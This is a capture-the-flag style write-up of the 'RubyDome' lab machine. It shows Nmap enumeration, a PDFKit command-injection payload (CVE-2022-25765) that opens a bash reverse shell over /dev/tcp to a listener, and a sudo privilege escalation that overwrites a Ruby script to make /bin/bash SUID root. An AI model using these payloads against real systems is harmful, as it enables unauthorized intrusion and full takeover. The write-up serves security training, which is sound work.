##### Tags: `CVE-2022-25765 `  `input`  `ruby`  `script` 

# 🐧RubyDome🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.239.22

22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 3000 is running a webpage of RubyDome HTML to PDF  
search and found CVE-2022-25765  
there is a cmd injection in the input box  
https://github.com/lekosbelas/PDFkit-CMD-Injection
```
http://"TARGET_ADDRESS:Target PORT"//?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/"Target_ADRESS/LISTENING_PORT"<&1'`'}
```
we put our ip address and got the revershell
```
http://192.168.45.210:22//?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/"192.168.45.210/22"<&1'`'}


$ nc -lvnp 22                                                               
listening on [any] 22 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.239.22] 56928

andrew@rubydome:~/app$ id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
```
## Privilege Escalation
  
user andrew can run ruby for the script app.rb as root
```
andrew@rubydome:~$ sudo -l
Matching Defaults entries for andrew on rubydome:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```
we have write permission of the script app.rb
```
andrew@rubydome:~/app$ ls -la
total 20
drwxr-xr-x 2 andrew andrew 4096 Apr 25  2023 .
drwxr-x--- 3 andrew andrew 4096 Jun 13  2023 ..
-rwxrwx--- 1 andrew andrew 1032 Apr 24  2023 app.rb
-rw-rw-r-- 1 andrew andrew 8171 Jun  8  2023 page.pdf
```
edit the script 
```
andrew@rubydome:~/app$ echo 'system("chmod +s /bin/bash")' > /home/andrew/app/app.rb
```
run the sudo to with no password
```
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
```
can the root terminal

```
andrew@rubydome:~/app$ bash -p

id
uid=1001(andrew) gid=1001(andrew) euid=0(root) egid=0(root) groups=0(root),27(sudo),1001(andrew)
```
